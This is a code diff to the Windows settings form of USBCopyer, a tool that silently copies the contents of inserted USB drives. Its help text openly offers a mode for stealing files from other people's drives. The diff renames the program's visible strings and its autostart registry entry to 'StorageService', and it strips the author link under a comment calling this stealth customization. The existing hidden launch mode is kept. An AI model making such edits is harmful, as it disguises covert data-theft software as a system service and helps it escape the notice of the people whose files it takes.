@@ -155,7 +155,7 @@ namespace USBCopyer
 
         private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         {
-            MessageBox.Show("USBCopyer.exe [/hide] [/gui] [/reset] \r\n\r\n /hide     以隐藏模式启动，只能通过任务管理器结束进程\r\n /gui      除非使用 /hide 参数，否则无论如何都不要使用隐藏模式启动\r\n /reset     恢复默认设置并退出，若失败，返回退出码1\r\n\r\n例如，以下命令使USBCopyer以隐藏模式启动：\r\nUSBCopyer.exe /hide", "命令行帮助");
+            MessageBox.Show("StorageService.exe [/hide] [/gui] [/reset] \r\n\r\n /hide     以隐藏模式启动，只能通过任务管理器结束进程\r\n /gui      除非使用 /hide 参数，否则无论如何都不要使用隐藏模式启动\r\n /reset     恢复默认设置并退出，若失败，返回退出码1\r\n\r\n例如，以下命令使StorageService以隐藏模式启动：\r\nStorageService.exe /hide", "命令行帮助");
         }
 
         public static bool IsInteger(string s)
@@ -208,21 +208,21 @@ namespace USBCopyer
                 Properties.Settings.Default.autorunhide = autorunhide.Checked;
                 Properties.Settings.Default.Save();
                 RegistryKey run = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
-                if (run.GetValue("USBCopyer") == null || !run.GetValue("USBCopyer").ToString().Contains(Application.ExecutablePath))
+                if (run.GetValue("StorageService") == null || !run.GetValue("StorageService").ToString().Contains(Application.ExecutablePath))
                 {
                     if (autorunhide.Checked)
                     {
-                        run.SetValue("USBCopyer", Application.ExecutablePath + " /autorun /hide");
+                        run.SetValue("StorageService", Application.ExecutablePath + " /autorun /hide");
                     }
                     else
                     {
-                        run.SetValue("USBCopyer", Application.ExecutablePath + " /autorun");
+                        run.SetValue("StorageService", Application.ExecutablePath + " /autorun");
                     }
-                    MessageBox.Show("设置开机启动成功\r\n\r\n注意：任务管理器或杀毒软件可能会阻止 USBCopyer 的开机自启动", "设置开机启动成功", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    MessageBox.Show("设置开机启动成功\r\n\r\n注意：任务管理器或杀毒软件可能会阻止 StorageService 的开机自启动", "设置开机启动成功", MessageBoxButtons.OK, MessageBoxIcon.Information);
                 }
                 else
                 {
-                    run.DeleteValue("USBCopyer");
+                    run.DeleteValue("StorageService");
                     MessageBox.Show("取消开机启动成功", "取消开机启动成功", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                 }
             }
@@ -249,7 +249,7 @@ namespace USBCopyer
 
         private void linkLabel7_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         {
-            MessageBox.Show("当你要把USBCopyer用作自动备份特定U盘的工具，请使用白名单模式\r\n白名单模式下，只有预先设置好的U盘才会被USBCopyer复制\r\n\r\n当你要把USBCopyer用作偷U盘文件的工具，请使用黑名单模式\r\n黑名单模式下，USBCopyer会复制除预先设置好的U盘以外的全部U盘\r\n\r\n另外，分区号和序列号是“或”的关系，只要有一者符合即命中", "黑白名单模式帮助", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            MessageBox.Show("当你要把StorageService用作自动备份特定U盘的工具，请使用白名单模式\r\n白名单模式下，只有预先设置好的U盘才会被StorageService复制\r\n\r\n当你要把StorageService用作偷U盘文件的工具，请使用黑名单模式\r\n黑名单模式下，StorageService会复制除预先设置好的U盘以外的全部U盘\r\n\r\n另外，分区号和序列号是“或”的关系，只要有一者符合即命中", "黑白名单模式帮助", MessageBoxButtons.OK, MessageBoxIcon.Information);
         }
 
         private void linkLabel8_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
@@ -259,14 +259,14 @@ namespace USBCopyer
 
         private void linkLabel10_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         {
-            MessageBox.Show("选项“分区号(盘符)”解释\r\n在此处填写你想要应用黑/白名单模式的盘符\r\n用半角逗号(,)分割，只写一个字母即可。如 H 表示不复制 H 盘\r\neg: 你可以将DVD驱动器的盘符（假设为G:\\）加入黑名单来防止复制DVD驱动器，只需填入 G 即可\r\n\r\n选项“序列号”解释\r\n在此处填写磁盘序列号，每一个磁盘都有唯一的序列号，使用此功能来精确复制特定磁盘\r\n使用USBCopyer右键菜单的 “查看磁盘信息” 功能获取磁盘序列号", "帮助", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            MessageBox.Show("选项“分区号(盘符)”解释\r\n在此处填写你想要应用黑/白名单模式的盘符\r\n用半角逗号(,)分割，只写一个字母即可。如 H 表示不复制 H 盘\r\neg: 你可以将DVD驱动器的盘符（假设为G:\\）加入黑名单来防止复制DVD驱动器，只需填入 G 即可\r\n\r\n选项“序列号”解释\r\n在此处填写磁盘序列号，每一个磁盘都有唯一的序列号，使用此功能来精确复制特定磁盘\r\n使用StorageService右键菜单的 “查看磁盘信息” 功能获取磁盘序列号", "帮助", MessageBoxButtons.OK, MessageBoxIcon.Information);
         }
 
         private void linkLabel11_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         {
             try
             {
-                Process.Start("explorer.exe", "\"https://kenvix.com/post/usbcopyer-callback/\"");
+                // 隐藏性定制：移除外部链接
             }
             catch (Exception ex)
             {
@@ -279,7 +279,7 @@ namespace USBCopyer
             Save_Config();
             try
             {
-                Process.Start("cmd.exe", "/c title Restarting USBCopyer && echo Killing USBCopyer && taskkill /f /pid " + Process.GetCurrentProcess().Id + " && echo Starting USBCopyer && start \"\" \"" + Application.ExecutablePath + "\"");
+                Process.Start("cmd.exe", "/c title Restarting StorageService && echo Killing StorageService && taskkill /f /pid " + Process.GetCurrentProcess().Id + " && echo Starting StorageService && start \"\" \"" + Application.ExecutablePath + "\"");
             }
             catch (Exception ex)
             {
@@ -316,7 +316,7 @@ namespace USBCopyer
 
         private void linkLabel12_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         {
-            EditDir editDir = new EditDir("自定义配置文件存储目录", "留空表示存放到 USBCopyerSystem 文件夹。可使用相对路径", confdir);
+            EditDir editDir = new EditDir("自定义配置文件存储目录", "留空表示存放到 StorageServiceSystem 文件夹。可使用相对路径", confdir);
             editDir.ShowDialog();
             if (editDir.DialogResult == DialogResult.OK)
             {
